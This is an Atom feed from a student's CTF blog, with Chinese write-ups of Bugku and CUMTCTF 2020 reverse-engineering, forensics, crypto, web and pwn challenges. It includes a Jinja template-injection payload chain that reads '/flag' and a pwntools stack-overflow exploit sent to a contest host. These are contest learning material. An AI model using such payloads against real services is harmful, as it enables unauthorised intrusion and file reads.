<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://7usai.github.io</id>
    <title>7usai</title>
    <updated>2020-11-23T14:30:11.162Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://7usai.github.io"/>
    <link rel="self" href="https://7usai.github.io/atom.xml"/>
    <subtitle>7usai&apos;blog</subtitle>
    <logo>https://7usai.github.io/images/avatar.png</logo>
    <icon>https://7usai.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 7usai</rights>
    <entry>
        <title type="html"><![CDATA[Bugku_re]]></title>
        <id>https://7usai.github.io/post/Iyci4MHI2/</id>
        <link href="https://7usai.github.io/post/Iyci4MHI2/">
        </link>
        <updated>2020-11-23T13:42:17.000Z</updated>
        <content type="html"><![CDATA[<h1 id="bugku_re">Bugku_re</h1>
<p>无壳，载入IDA32位</p>
<p>main函数_汇编代码</p>
<pre><code>; Attributes: bp-based frame

; int __cdecl main(int argc, const char **argv, const char **envp)
public _main
_main proc near

argc= dword ptr  8
argv= dword ptr  0Ch
envp= dword ptr  10h

push    ebp
mov     ebp, esp
and     esp, 0FFFFFFF0h
sub     esp, 30h
call    ___main
mov     dword ptr [esp], offset aHiThisIsABabyr ; &quot;Hi~ this is a babyre&quot;
call    _printf
mov     byte ptr [esp+2Fh], 'f'
mov     byte ptr [esp+2Eh], 'l'
mov     byte ptr [esp+2Dh], 'a'
mov     byte ptr [esp+2Ch], 'g'
mov     byte ptr [esp+2Bh], '{'
mov     byte ptr [esp+2Ah], 'R'
mov     byte ptr [esp+29h], 'e'
mov     byte ptr [esp+28h], '_'
mov     byte ptr [esp+27h], '1'
mov     byte ptr [esp+26h], 's'
mov     byte ptr [esp+25h], '_'
mov     byte ptr [esp+24h], 'S'
mov     byte ptr [esp+23h], '0'
mov     byte ptr [esp+22h], '_'
mov     byte ptr [esp+21h], 'C'
mov     byte ptr [esp+20h], '0'
mov     byte ptr [esp+1Fh], 'O'
mov     byte ptr [esp+1Eh], 'L'
mov     byte ptr [esp+1Dh], '}'
mov     eax, 0
leave
retn
_main endp

</code></pre>
<p>得flag=flag{Re_1s_S0_C0oL}</p>
<h2 id="easy_vb">Easy_vb</h2>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1606138995857.png" alt="" loading="lazy"></figure>
<p>ollyice打开，右键查看所有参考文本字符串，双击定位到此处得flag=MCTF{<em>N3t_Rev_1s_E4ay</em>_}</p>
<h2 id="easy_re">Easy_Re</h2>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1606139008565.png" alt="" loading="lazy"></figure>
<p>IDA载入直接找到，逆序输出得flag=DUTCTF{We1c0met0DUTCTF}</p>
<h2 id="游戏过关">游戏过关</h2>
<p>无壳32位，载入IDA</p>
<p>shift+f12找到此字符串，交叉引用进入函数</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1606139016187.png" alt="" loading="lazy"></figure>
<p>得到两个字符串以及异或算法</p>
<pre><code>int sub_45E940()
{//过长，注释掉了一部分
  memset(&amp;v3, 0xCCu, 0x158u);
  v119 = (unsigned int)&amp;savedregs ^ __security_cookie;
  sub_45A7BE(&quot;done!!! the flag is &quot;);
  v62 = 18;
  ........//过长，注释掉了一部分
  v118 = 0;
  v5 = 123;
  .......//过长，注释掉了一部分
  v61 = 0;
  for ( i = 0; i &lt; 56; ++i )
  {
    *(&amp;v5 + i) ^= *(&amp;v62 + i);//v5[i]^=v62[i]
    *(&amp;v5 + i) ^= 0x13u;//v5[i]^0x13
  }//相当于v5[i]^=v62[i]^0x13
  sub_45A7BE(&quot;%s\n&quot;);//输出函数
  sub_459AE9(&amp;savedregs, &amp;dword_45EC04);
  sub_459C06();
  return sub_458801(v1, v0);
}
</code></pre>
<p>提取出v5开头数组以及v62开头数组得值写脚本</p>
<p>exp脚本</p>
<pre><code>v62 = [0x12, 0x40, 0x62, 0x5, 0x2, 0x4, 0x6, 0x3, 0x6, 0x30, 0x31, 0x41, 0x20, 0x0C, 0x30, 0x41, 0x1F, 0x4E, 0x3E, 0x20,
       0x31, 0x20, 0x1, 0x39, 0x60, 0x3, 0x15, 0x9, 0x4, 0x3E, 0x3, 0x5, 0x4, 0x1, 0x2, 0x3, 0x2C, 0x41, 0x4E, 0x20,
       0x10, 0x61, 0x36, 0x10, 0x2C, 0x34, 0x20, 0x40, 0x59, 0x2D, 0x20, 0x41, 0x0F, 0x22, 0x12, 0x10, 0x0]

v5 = [0x7B, 0x20, 0x12, 0x62, 0x77, 0x6C, 0x41, 0x29, 0x7C, 0x50, 0x7D, 0x26, 0x7C, 0x6F, 0x4A, 0x31, 0x53, 0x6C, 0x5E,
       0x6C, 0x54, 0x6, 0x60, 0x53, 0x2C, 0x79, 0x68, 0x6E, 0x20, 0x5F, 0x75, 0x65, 0x63, 0x7B, 0x7F, 0x77, 0x60, 0x30,
       0x6B, 0x47, 0x5C, 0x1D, 0x51, 0x6B, 0x5A, 0x55, 0x40, 0x0C, 0x2B, 0x4C, 0x56, 0x0D, 0x72, 0x1, 0x75, 0x7E, 0x0]

flag = &quot;&quot;
for i in range(len(v5)):
    flag += chr(v5[i] ^ v62[i] ^ 0x13)
print (flag)
</code></pre>
<p>得flag=zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</p>
<h2 id="timer">Timer</h2>
<p>得到一个apk文件，放入JEB中打开，搜索字符串双击，右键解析，进入函数</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1606139042244.png" alt="" loading="lazy"></figure>
<p>定位到此处</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1606139062205.png" alt="" loading="lazy"></figure>
<p>不标图片了，标代码块，有注释，方便</p>
<p>思路代码</p>
<pre><code>    protected void onCreate(Bundle arg7) {  // 关键函数
        super.onCreate(arg7);
        this.setContentView(0x7F040018);  // layout:activity_main
        TextView tv1 = (TextView)this.findViewById(0x7F0C0050);  // id:textView2
        TextView tv2 = (TextView)this.findViewById(0x7F0C0051);  // id:textView3
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                MainActivity.this.t = System.currentTimeMillis();
                MainActivity.this.now = (int)(MainActivity.this.t / 1000L);
                MainActivity.this.t = 1500L - MainActivity.this.t % 1000L;
                tv2.setText(&quot;AliCTF&quot;);
                if(MainActivity.this.beg - MainActivity.this.now &lt;= 0) {  // 成功时得flag,beg=20000,now为系统时间，意思就是要等200000秒给flag,尝试不去等
                    tv1.setText(&quot;The flag is:&quot;);
                    tv2.setText(&quot;alictf{&quot; + MainActivity.this.stringFromJNI2(MainActivity.this.k) + &quot;}&quot;);
                }

                if(MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) {  // 确定k值函数
                    MainActivity.this.k += 100;
                }
                else {
                    --MainActivity.this.k;
                }
</code></pre>
<p>获得k值的is2函数</p>
<pre><code>public static boolean is2(int arg4) {  // arg4=k,得到k的函数
    if(arg4 &lt;= 3) {
        return arg4 &gt; 1;
    }

    if(arg4 % 2 == 0 || arg4 % 3 == 0) {
        return false;
    }

    int i;
    for(i = 5; i * i &lt;= arg4; i += 6) {
        if(arg4 % i == 0 || arg4 % (i + 2) == 0) {
            return false;
        }
    }

    return true;
}
</code></pre>
<p>我们模仿函数，直接写c++代码</p>
<pre><code>#include&lt;iostream&gt;
using namespace std;
 

bool is2(int arg4)
{
if(arg4 &lt;= 3) {
            return arg4 &gt; 1;
        }

        if(arg4 % 2 == 0 || arg4 % 3 == 0) {
            return false;
        }

        int i;
        for(i = 5; i * i &lt;= arg4; i += 6) {
            if(arg4 % i == 0 || arg4 % (i + 2) == 0) {
                return false;
            }
        }

        return true;
}
int main()
{
    int time = 200000;
    int k = 0;
    while(time &gt; 0)
    {
        if(is2(time))
                k+=100;
        else
                k--;  
        time--;
    }
    cout &lt;&lt; &quot;k=&quot; &lt;&lt; k &lt;&lt; endl ;
    return 0;
}
//思路是自己给定time值为200000，每次获得一个k值变化就减1,相当于每1秒进行一次k值计算，跟原函数思路一致
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1606139093219.png" alt="" loading="lazy"></figure>
<p>得k值为1616384.</p>
<p>下一步就修改k值保存apk文件并在安卓系统上运行就得flag.</p>
<p>用androidkiller打开，搜索stringFromJNI2</p>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1606139102944.png" alt="" loading="lazy"></figure>
<p>观察139和141行</p>
<pre><code>iget v3, v3, Lnet/bluelotus/tomorrow/easyandroid/MainActivity;-&gt;k:I      //将k值放在v3里 

invoke-virtual {v2, v3}, Lnet/bluelotus/tomorrow/easyandroid/MainActivity;-&gt;stringFromJNI2(I)Ljava/lang/String;
</code></pre>
<p>直接修改，将v3改为1616384</p>
<pre><code>iget v3, v3, Lnet/bluelotus/tomorrow/easyandroid/MainActivity;-&gt;k:I     
   
const v3;1616384  

invoke-virtual {v2, v3}, Lnet/bluelotus/tomorrow/easyandroid/MainActivity;-&gt;stringFromJNI2(I)Ljava/lang/String;
</code></pre>
<p>此时已经将k=0改为了k=1616384，然后我们要改判断，</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1606139113978.png" alt="" loading="lazy"></figure>
<pre><code>将if-gtz v0, :cond_0改为if-lez v0, :cond_0
</code></pre>
<p>之后就编译打包，放入安卓系统中运行</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1606139123988.png" alt="" loading="lazy"></figure>
<p>得到flag=alictf{Y0vAr3TimerMa3te7}</p>
<h2 id="逆向入门">逆向入门</h2>
<p>这题好怪，根本不像re题</p>
<p>得到一个html文件</p>
<p>内容为</p>
<pre><code>data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAAGQCAYAAACAvzbMAAAgAElEQVR4Xu29CdhuyVXXW4dAmBIghqEDCIg5aWQmAyhT0oCgkj6CE4HjdT7pgHLVpGVwgsP14nBDixMGGofHxyYRRzodFS7Y6SBc0SSAECA5DDKmQcKUMKPnPr/vPdW9z9t77/rV3uutd7/fqXqe7+nkvLWrVv1r1frXsFbVhevXr19PPXUEOgIdgY5AR6ASgQudQCoR69k7Ah2BjkBH4AyBTiBdEToCHYGOQEdgEQKdQBbB1j/qCHQEOgIdgU4gXQc6Ah2BjkBHYBECnUAWwdY/6gh0BDoCHYFOIF0HOgIdgY5AR2ARAp1AFsHWP+oIdAQ6Ah2BTiBdBzoCHYGOQEdgEQJVBPLmN785PfDAA+kNb3hD+omf+ImbKiQe8cKFC4uE2P/IlBWVZ0rg22+/PT3taU9Lz33ucxe16TWveU3Kf0sKOHT7DOaRGDzjGc9Iz3nOc84wPVTKeKOfue/e8z3f81DVhZW7dlwZXUFYk28sDxhmPJ/4xCeGtXu/oJe+9KXpjW98YwKPNfVhm7Kdohx0j78lKZfz+te/fsnnizE343ORQBMfLe1jTSAMyr....................过长，省略
</code></pre>
<p>在线base64转图片，得到二维码，扫描得flag</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1606139138139.png" alt="" loading="lazy"></figure>
<h2 id="love">love</h2>
<p>找到main函数</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1606139147301.png" alt="" loading="lazy"></figure>
<p>发现base64表猜测是base64转换</p>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1606139154144.png" alt="" loading="lazy"></figure>
<p>进入sub_4110BE发现果然是</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1606139162403.png" alt="" loading="lazy"></figure>
<p>在线base64转换有错</p>
<p>直接编写脚本</p>
<pre><code>import base64
s =&quot;e3nifIH9b_C@n@dH&quot;
flag =&quot;&quot;
for i in range(len(s)):
    flag += chr(ord(s[i])-i)
flag = base64.b64decode(flag)
print(flag)
</code></pre>
<p>得flag={i_l0ve_you}</p>
<h2 id="loopandloop">LoopAndLoop</h2>
<p>用JEB打开</p>
<p>主要函数</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1606139171702.png" alt="" loading="lazy"></figure>
<p>将输入得数与99进行函数变化得到得值与0x6D6F1462比较，相同则成功</p>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1606139179251.png" alt="" loading="lazy"></figure>
<p>因为check中有chec，调用了native层的原生函数chec</p>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1606139186941.png" alt="" loading="lazy"></figure>
<p>此处可知库名为lhm</p>
<p>将后缀由apk改为zip并解压找到liblhm.so放入IDA</p>
<p>关键函数</p>
<pre><code>int __fastcall Java_net_bluelotus_tomorrow_easyandroid_MainActivity_chec(int a1, int a2, int a3, int a4)
{
  int v4; // r4
  int v5; // r7
  int result; // r0
  int v7; // [sp+Ch] [bp-34h]
  int v8; // [sp+10h] [bp-30h]
  int v9; // [sp+14h] [bp-2Ch]
  int v10; // [sp+1Ch] [bp-24h]
  int v11; // [sp+20h] [bp-20h]
  int v12; // [sp+24h] [bp-1Ch]

  v9 = a2;
  v8 = a4;
  v4 = a1;
  v7 = a3;
  v5 = (*(int (**)(void))(*(_DWORD *)a1 + 24))();
  v10 = _JNIEnv::GetMethodID(v4, v5, &quot;check1&quot;, &quot;(II)I&quot;);
  v11 = _JNIEnv::GetMethodID(v4, v5, &quot;check2&quot;, &quot;(II)I&quot;);
  v12 = _JNIEnv::GetMethodID(v4, v5, &quot;check3&quot;, &quot;(II)I&quot;);
  if ( v8 - 1 &lt;= 0 )                            // v8=99,循环99次
    result = v7;
  else
    result = _JNIEnv::CallIntMethod(v4, v9, *(&amp;v10 + 2 * v8 % 3), v7, v8 - 1);// *(&amp;v10 + 2 * v8 % 3)决定了调用三个check方法中的哪一个，当2*v8%3=0时调用check1，等于1时调用check2，等于2时调用check3
  return result;
}                                               // 第二个值初始值为99，用来控制流程终止以及判断调用check1，check2，check3中的哪一个函数，每次调用时第二个值都减1，当返回值等于1835996258时输出flag。
</code></pre>
<p>脚本</p>
<pre><code>#include &lt;bits/stdc++.h&gt;
 
using namespace std;
 
int main()
{
	long long num=99;
	long long flag=1835996258;
	while(num-1&gt;0)
		{
			long long tmp=num*2%3;
			if(tmp==0)
				for(long long i=0;i&lt;100;i++)
					flag-=i;
			if(tmp==1)
				if((num-1)%2==0)
					for(long long i=0;i&lt;1000;i++)
						flag-=i;
				else
					for(long long i=0;i&lt;1000;i++)
						flag+=i;
			if(tmp==2)
				for(long long i=0;i&lt;10000;i++)
					flag-=i;
			num--;
		}
	cout&lt;&lt;flag&lt;&lt;endl;
	return 0;
}
</code></pre>
<p>得到的数输入进apk里得flag=alictf{Jan6N100p3r}</p>
<h2 id="easy-100lctf">easy-100(LCTF)</h2>
<p>关键函数</p>
<pre><code>private void p() {
    try {
        InputStream v0_1 = this.getResources().getAssets().open(&quot;url.png&quot;);
        int v1 = v0_1.available();
        byte[] v2 = new byte[v1];
        v0_1.read(v2, 0, v1);
        byte[] v0_2 = new byte[16];
        System.arraycopy(((Object)v2), 0x90, ((Object)v0_2), 0, 16);
        this.v = new String(v0_2, &quot;utf-8&quot;);
    }
    catch(Exception v0) {
        v0.printStackTrace();
    }

protected void a(byte[] arg4) {
    if(arg4 != null) {
        goto label_15;
    }

    try {
        byte[] v0_3 = &quot;&quot;.getBytes(&quot;utf-8&quot;);
        this.a = new SecretKeySpec(MessageDigest.getInstance(&quot;MD5&quot;).digest(v0_3), &quot;AES&quot;);
        this.b = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);
        return;
    label_15:
        this.a = new SecretKeySpec(arg4, &quot;AES&quot;);
        this.b = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);
    }
    catch(UnsupportedEncodingException v0_2) {
        v0_2.printStackTrace();
    }
    catch(NoSuchAlgorithmException v0_1) {
        v0_1.printStackTrace();
    }
    catch(NoSuchPaddingException v0) {
        v0.printStackTrace();
    }
}

protected byte[] b(byte[] arg4) {
    this.b.init(1, this.a);
    return this.b.doFinal(arg4);
}
</code></pre>
<p>从url.png中获得key，然后使用handle函数进行处理（奇偶位互换）作为最终AES加密的key。</p>
<pre><code>byte[] bye = {21,-93,-68,-94,86,117,-19,-68,-92,33,50,118,16,13,1,-15,-13,3,4,103,-18,81,30,68,54,-93,44,-23,93,98,5,59};
new String(bye);
</code></pre>
<p>AES/ECB/PKCS5Padding对密文解密得</p>
<p>flag=LCTF{1t's_rea1ly_an_ea3y_ap4}</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[寒假之前的计划（re_wp暂时存为草稿防止作业抄袭）]]></title>
        <id>https://7usai.github.io/post/LNWC1dDnX/</id>
        <link href="https://7usai.github.io/post/LNWC1dDnX/">
        </link>
        <updated>2020-11-15T15:05:51.000Z</updated>
        <content type="html"><![CDATA[<p>①复习信安数学，网安，认真学习密码学以及网安实验<br>
②看一遍加密与解密，基本了解<br>
③学透网安课本<br>
④背单词并看一遍高数课本，复习计网相关知识<br>
⑤暂时停止CTF学习<br>
⑥读linux二进制分析<br>
⑦少喝酒，跳绳</p>
<p>ps:寒假之前应该不会更新了</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMTCTF2020华为杯决赛]]></title>
        <id>https://7usai.github.io/post/tHs44F2g1/</id>
        <link href="https://7usai.github.io/post/tHs44F2g1/">
        </link>
        <updated>2020-10-21T15:54:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cumtctf2020华为杯">CUMTCTF2020华为杯</h1>
<p>[TOC]</p>
<h2 id="misc">misc</h2>
<h3 id="signin">SignIn</h3>
<p>十六进制编译器打开，复制后base64解码，在brainfuck解码，得flag=CUMTCTF{Welcome_to_CUMTCTF_2020_Final}</p>
<h3 id="出个流量分析题吧">出个流量分析题吧</h3>
<p>wireshark打开，搜索flag字符串就找到</p>
<h3 id="出个lsb吧">出个LSB吧</h3>
<p>解压发现是个图片，用stegsolve打开，发现在red/green/blue plane0 上方有不明黑色块，在analyse中打开data extract，勾选三个0，save bin 以png格式保存，得到一张二维码</p>
<h3 id="出个文档吧">出个文档吧</h3>
<p>打开docx文件，明文是摩斯密码，解密得FLAG IS NOT HERE，提示flag不是这个。猜测是文件隐写，检查文档发现隐藏的flag:</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1603788730325.jpg" alt="" loading="lazy"></figure>
<h3 id="出个伪web吧">出个伪web吧</h3>
<p>就硬照，找到后加上flag{}</p>
<h3 id="出个压缩包吧">出个压缩包吧</h3>
<p>解压得到的flag.rar文件放入十六进制编译器后，发现其中有个隐藏的secret.png，其中头文件错了，将7A改为74</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1603788744549.png" alt="" loading="lazy"></figure>
<p>得到的secret.png放入十六进制编译器后</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1603788753774.png" alt="" loading="lazy"></figure>
<p>文件后缀改为gif后放入stegsolve</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1603788760915.png" alt="" loading="lazy"></figure>
<p>发现只有一半，分离图层</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1603788769865.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1603788779016.png" alt="" loading="lazy"></figure>
<p>补全左上角和右上角扫描得flag</p>
<h3 id="出个内存取证吧">出个内存取证吧</h3>
<p>得到一份镜像文件，用Volatility进行分析</p>
<p>分析镜像：volatility -f memory.img imageinfo</p>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1603788789704.png" alt="" loading="lazy"></figure>
<p>猜测profile值为Win2003SP1x86</p>
<p>查看进程：volatility -f memory.img --profile=Win2003SP1x86 pslist</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1603788798868.png" alt="" loading="lazy"></figure>
<p>发现一个DumpIT.exe</p>
<p>查看之前运行过的进程： volatility -f memory.img --profile=Win2003SP1x86 userassist<br>
提取explorer.exe进程：volatility -f memory.img --profile=Win2003SP1x86 memdump -p 1992 --dump-dir=./</p>
<p>得到1992.dmp文件，然后foremost 1992.dmp -T提取</p>
<p>在png文件夹里里发现了4个图片</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1603788809653.png" alt="" loading="lazy"></figure>
<p>扫描得jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</p>
<p>有key值和vi，为AES加密</p>
<p>http://tool.chacuo.net/cryptaes</p>
<h2 id="crypto">Crypto</h2>
<h3 id="classical">Classical</h3>
<p>vigenere密码</p>
<p>https://www.guballa.de/vigenere-solver</p>
<h3 id="earsa">eaRSA</h3>
<p>winner attack</p>
<p>网上找的轮子，直接跑脚本就得出flag</p>
<h2 id="web">Web</h2>
<h3 id="doge">doge</h3>
<p>真签到题，抽个奖就给出了flag</p>
<h3 id="babyflask">babyflask</h3>
<p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
<p>就是了模板注入</p>
<pre><code>url+{{7*7}}
</code></pre>
<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
<pre><code>{{''.__class__.__mro__[2].__subclasses__()}}
查看模块时，发现存在waf
经过测试发现是过滤了[]
于是使用
{{''.__class__.__mro__.__getitem__(2).__subclasses__()}}
存在file模块
用read读取文件内容
exp:
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag').read()  
</code></pre>
<h2 id="re">re</h2>
<h3 id="hello_world">hello_world</h3>
<p>无壳，64位，直接放入IDA</p>
<p>关键函数</p>
<pre><code>signed __int64 __fastcall sub_40156F(const char *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdx
  int i; // [rsp+2Ch] [rbp-54h]
  __int64 v7; // [rsp+60h] [rbp-20h]

  v7 = a4;
  for ( i = 0; i &lt; strlen(a1); ++i )
  {
    a2 = byte_403020[i];
    a1 = *(i + v7);
    if ( a2 != (a1 ^ aIsEasyRight[i % strlen(a1)]) )
    {
      sub_401530();
      printf(a1, a2, v4, &quot;wrong!!!&quot;);
      return 0LL;
    }
  }
  printf(a1, a2, &quot;you got it!!!&quot;, &quot;%s&quot;);
  return 1LL;
}
</code></pre>
<p>简单的异或，aIsEasyRight和byte_403020值已知，</p>
<p>脚本</p>
<pre><code>a=[  0x2A, 0x26, 0x12, 0x31, 0x1A, 0x07, 0x11, 0x3A, 0x2D, 0x0F,
  0x0E, 0x1A, 0x41, 0x4B, 0x36, 0x43, 0x31, 0x00, 0x3E, 0x16,
  0x17, 0x35, 0x1D, 0x10, 0x38, 0x11, 0x44, 0x4A, 0x1B, 0x2C,
  0x2B, 0x17, 0x50, 0x03, 0x04]
print(len(a))
b='is_easy_right?is_easy_right?is_easy_right?'
print(len(b))
c=''
for i in range(len(a)):
    c+=chr(ord(b[i])^a[i])
print (c)
</code></pre>
<p>得flag=CUMT{the_fir5t_0ne_enjoy_y0ur_tr1p}</p>
<h3 id="non_name">non_name</h3>
<p>无壳，64位</p>
<p>关键函数</p>
<pre><code>signed __int64 sub_401530()
{
  signed int j; // [rsp+8h] [rbp-8h]
  signed int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i &lt;= 3; ++i )
  {
    dword_407044 = 0;
    for ( j = 0; j &lt;= 3; ++j )
      dword_407044 += byte_403010[4 * i + j] * byte_40703E[j];
    if ( dword_403020[i] != dword_407044 )
      return 0LL;
  }
  return 1LL;
}
</code></pre>
<p>稍微改一下</p>
<pre><code>signed __int64 sub_401530()
{
  signed int j; // [rsp+8h] [rbp-8h]
  signed int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i &lt;= 3; ++i )
  {
    dword_407044 = 0;
    for ( j = 0; j &lt;= 3; ++j )
      dword_407044 += a[4 * i + j] * flag[j];
    if ( b[i] != dword_407044 )
      return 0LL;
  }
  return 1LL;
}
</code></pre>
<p>通过b和a中得数已知，相当于循环4次，每次b[i]=a[4 * i +j] * flag[j] + a[4 * i +j+1] * flag[j+1] + a[4 * i +j+2] * flag[j+2] + a[4 * i +j+3] * flag[j+3]，相当于如下线性方程组</p>
<figure data-type="image" tabindex="10"><img src="F:%5Cmarkdown%5CTypora%5CSAVES%5Cblog%E5%9B%BE%E7%89%87%5C042014092413.gif" alt="线性方程组" loading="lazy"></figure>
<p>其中x为flag</p>
<p>可以直接在线网站求解的4个十进制数</p>
<p>https://www.buildenvi.com/gongju/formula/3lck4</p>
<p>再转为hex得flag</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1603788824640.png" alt="" loading="lazy"></figure>
<p>用z3或者matlab是最好的，这里给出z3脚本</p>
<pre><code>from z3 import *
s=Solver()
x1,x2,x3,x4=Ints(&quot;x1 x2 x3 x4&quot;)
s.add(0x2534 == 0x0c*x1+0x20*x2+0x22*x3+0x0c*x4)
s.add(0x1AFF == 0x35*x1+0x01*x2+0x02*x3+0x04*x4)
s.add(0x2786 == 0x06*x1+0x08*x2+0x22*x3+0x2D*x4)
s.add(0x5B44 == 0x38*x1+0x20*x2+0x55*x3+0x2B*x4)
flag=[]

if s.check() == sat:
    ans = s.model()
    flag.append(ans[x1])
    flag.append(ans[x2])
    flag.append(ans[x3])
    flag.append(ans[x4])
print(flag)
</code></pre>
<h2 id="pwn">pwn</h2>
<h3 id="login">login</h3>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.os='linux'
#r=process('./login')
r=remote('219.219.61.234',10000)
#gdb.attach(r)
r.recvuntil(&quot;choice: &quot;)
r.sendline(&quot;1&quot;)
r.recvuntil(&quot;Enter your username(length less than 20):&quot;)
r.sendline('aaaa')
r.recvuntil(&quot;Enter your password(length less than 20):&quot;)
payload='a'*0x48+p64(0x004009F7)
r.send(payload)
r.interactive()
</code></pre>
<h3 id="login_plus">login_plus</h3>
<p>将__int 64 的数付给 int 的数，存在整数溢出，输入 4294967296，就可以拿到 flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMT校赛200923]]></title>
        <id>https://7usai.github.io/post/lgs4SdGy2/</id>
        <link href="https://7usai.github.io/post/lgs4SdGy2/">
        </link>
        <updated>2020-09-27T11:08:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cumt校赛">CUMT校赛</h1>
<p>[TOC]</p>
<h2 id="crypto">Crypto</h2>
<h3 id="幼儿园的密码题">幼儿园的密码题</h3>
<h4 id="脚本">脚本</h4>
<p>已知n求p,q</p>
<p>http://www.factordb.com/</p>
<p>n,e,c转成10进制</p>
<pre><code>import gmpy2
p=324350545929838254331191385863847627003
q=328413456989577256301798468872388310877
n=106521084065274837947153338013414677016150003618052696631715598225251903811631
c=40448992051548719008529549070468060415257485938698092782029814901918646701101
e=65537
d = gmpy2.invert(e,(p-1)*(q-1))
key=pow(c, d, n)
print(d)
print(key)
</code></pre>
<p>得出来的key转十六进制再转字符(真的真的很没意思)</p>
<h3 id="小学生的密码题">小学生的密码题</h3>
<pre><code>from secret import flag
def encode(ptext):
    dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]   		;dic='ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_'abcdefghijklmnopqrstuvwxyz{|}~
    m = [i for i in ptext]					;m=flag
    tmp = [];s = []						创建临时tmp和s
    for i in range(len(m)):					;range(flag长度)	
        for j in range(len(dic)):					;range(62)
            if m[i] == dic[j]:					;flag[i]==dic[j] 即为A到~时
                tmp.append(j + 1)					;tmp+=j+1(相当于ord(dic[j])-63)
    for i in tmp:						;遍历tmp中的数
        res = &quot;&quot;						
        if i &gt;= 8:						i&gt;=8(dic[j]&gt;=71时)	
            res += int(i/8)*&quot;8&quot;
        if i%8 &gt;=4:						i%8&gt;=4	
            res += int(i%8/4)*&quot;4&quot;					
        if i%4 &gt;=2:						
            res += int(i%4/2)*&quot;2&quot;
        if i%2 &gt;= 1:						
            res += int(i%2/1)*&quot;1&quot;
        s.append(res + &quot;0&quot;)
    print (&quot;&quot;.join(s)[:-1])
encode(flag)
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1601204975990.png" alt="" loading="lazy"></figure>
<p>硬算，算到一半发现加法就行，淦</p>
<h4 id="脚本-2">脚本</h4>
<pre><code>a=[2,20,12,19,2,19,5,58,24,46,52,30,32,49,36,30,17,40,38,39,51,60]
b=[67,85,77,84,67,84,70,123,89,111,117,95,97,114,101,95,82,105,103,104,116,125]
flag=''
for i in range(22):
    flag+=chr(b[i])
    print(flag)
</code></pre>
<p>a=上边一坨-1</p>
<p>b=a+65</p>
<p>得flag=CUMTCTF{You_are_Right}</p>
<h3 id="初中生的密码题">初中生的密码题</h3>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1601205029628.png" alt="" loading="lazy"></figure>
<p>先用z3求出来p和q的值，最后正常计算鸡号</p>
<h4 id="脚本-3">脚本</h4>
<pre><code>from z3 import *
n=84863698171133020391053396083357045534798634569079205401675021632743228202765373754550273178914587508206491037758512530700431698282940816939153530328477560508334120431855932811419946493330671807735818445564920135350034806684935609207273273159545958311255802539589755685337152695901848928215725824065792642893044277497848501450750578447669084509922736947849662664585107667938588325159492995203566108596159838854412671190298306552112817297825977875497069503727863904526635384053669734367563836650618371524067961009443108217327157934439234641245430913416438856035416891842170697941082675833395227743678033992690767928260184612579020426695840925321050730157561987825214651554279125971620112455837319781642130504677453573418956748159969038142837158069648605413548618250976288087736335625611633693005548331841545399946047510349498074855899388945967737457491074524238571192848966979052796945480153368275750895006569741074533825728971759814103120356641984058722147034063748603491168658769589070275306444147691784